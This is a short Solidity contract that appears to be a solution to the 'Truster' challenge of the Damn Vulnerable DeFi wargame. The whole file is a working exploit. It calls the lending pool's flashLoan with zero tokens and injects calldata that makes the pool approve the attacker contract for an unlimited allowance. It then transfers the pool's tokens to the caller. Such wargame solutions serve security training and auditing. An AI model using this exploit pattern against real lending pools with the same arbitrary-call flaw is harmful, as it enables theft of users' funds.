// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverTruster
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverTruster {

    TrusterLenderPool pool;
    address public tokenAddress;
    constructor(address poolAddress,address _token) {
        pool = TrusterLenderPool(poolAddress);
        tokenAddress = _token;
    }


    function executeFlashLoan(uint256 amount) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this),type(uint256).max);
        pool.flashLoan(0,msg.sender,tokenAddress,data);
        IERC20(tokenAddress).transferFrom(address(pool),msg.sender, amount);
    }
}